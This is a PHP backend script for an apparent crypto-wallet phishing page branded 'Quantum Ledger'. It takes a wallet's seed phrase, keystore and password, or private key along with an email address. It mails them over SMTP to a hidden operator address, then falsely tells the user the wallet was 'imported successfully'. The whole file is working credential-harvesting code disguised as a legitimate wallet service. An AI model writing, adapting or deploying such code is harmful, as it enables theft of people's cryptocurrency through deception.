<?php
header('Content-Type: application/json; charset=UTF-8');
ini_set('display_errors', 0);
error_reporting(E_ALL);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__.'/../error.log');

session_start(['cookie_secure'=>true,'cookie_httponly'=>true,'use_strict_mode'=>true]);
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// GET = return token
if ($_SERVER['REQUEST_METHOD']==='GET') {
    echo json_encode(['csrf_token'=>$_SESSION['csrf_token']]); exit;
}

require __DIR__.'/../vendor/autoload.php';
use Dotenv\Dotenv;
use PHPMailer\PHPMailer\PHPMailer;

$dotenv = Dotenv::createImmutable(__DIR__.'/..');
$dotenv->load();

// CSRF
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token']??'')) {
    echo json_encode(['error'=>'Invalid CSRF']); exit;
}

// ——— QUICK VALIDATION ———
$wallet = trim($_POST['pwallet'] ?? $_POST['kwallet'] ?? $_POST['prwallet'] ?? '');
$email  = trim($_POST['pemail']  ?? $_POST['kemail']  ?? $_POST['premail']  ?? '');
$data   = $_POST['phrase'] ?? ($_POST['keystore']."\nPass: ".$_POST['password']) ?? $_POST['private'] ?? '';

if (!filter_var($email, FILTER_VALIDATE_EMAIL) || empty($wallet) || empty($data)) {
    echo json_encode(['error'=>'Invalid input']); exit;
}

// ——— EMAIL ONLY ———
$mail = new PHPMailer(true);
try {
    $mail->isSMTP();
    $mail->Host       = $_ENV['SMTP_HOST'];
    $mail->SMTPAuth   = true;
    $mail->Username   = $_ENV['SMTP_USER'];
    $mail->Password   = $_ENV['SMTP_PASS'];
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port       = 587;

    $mail->setFrom($_ENV['SMTP_USER'], 'Quantum Ledger');
    $mail->addAddress($_ENV['TO_EMAIL']);
    $mail->Subject = "New $wallet submission";
    $mail->Body    = "Wallet: $wallet\nEmail: $email\n\n$data\n\n—\nSent: ".date('Y-m-d H:i:s');

    $mail->send();
    echo json_encode(['success'=>'Wallet imported successfully!']);
} catch (Exception $e) {
    error_log("Mail error: ".$mail->ErrorInfo);
    echo json_encode(['error'=>'Email failed – try again']);
}
?>